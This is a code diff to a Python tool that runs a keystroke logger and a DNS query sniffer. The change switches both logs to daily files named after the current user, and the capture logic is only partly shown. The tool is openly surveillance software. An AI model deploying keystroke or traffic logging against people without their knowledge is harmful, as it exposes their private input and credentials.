@@ -1,9 +1,17 @@
-from utilities import current_time, user_name, active_interface
+from utilities import user_name, active_interface
 from log_utils import log_console
 import logging
 import keyboard
 import scapy.all as scapy
 import sys
+import datetime
+
+def get_daily_log_filename(prefix):
+    """
+    Returns a log filename for today, e.g. keylog-USERNAME_YYYYMMDD.txt
+    """
+    today = datetime.datetime.now().strftime("%Y%m%d")
+    return f"{prefix}-{user_name()}_{today}.txt"
 
 def setup_logger(log_filename, logger_name):
     logger = logging.getLogger(logger_name)
@@ -19,10 +27,10 @@ def setup_logger(log_filename, logger_name):
 
 def key_logger():
     """
-    Starts the key logger and writes keystrokes to a uniquely named log file.
+    Starts the key logger and writes keystrokes to a daily log file.
     """
     log_console("Key Logger started and running...", "INFO")
-    log_filename = f"keylog-{user_name()}_{current_time()}.txt"
+    log_filename = get_daily_log_filename("keylog")
     logger = setup_logger(log_filename, "KeyLogger")
 
     def on_key_press(event):
@@ -41,10 +49,10 @@ def key_logger():
 
 def dns_logger():
     """
-    Starts the DNS logger and writes DNS queries to a uniquely named log file.
+    Starts the DNS logger and writes DNS queries to a daily log file.
     """
     log_console("DNS Query Logger started and running...", "INFO")
-    log_filename = f"dnslog-{user_name()}_{current_time()}.txt"
+    log_filename = get_daily_log_filename("dnslog")
     logger = setup_logger(log_filename, "DNSLogger")
 
     def process_packet(packet):
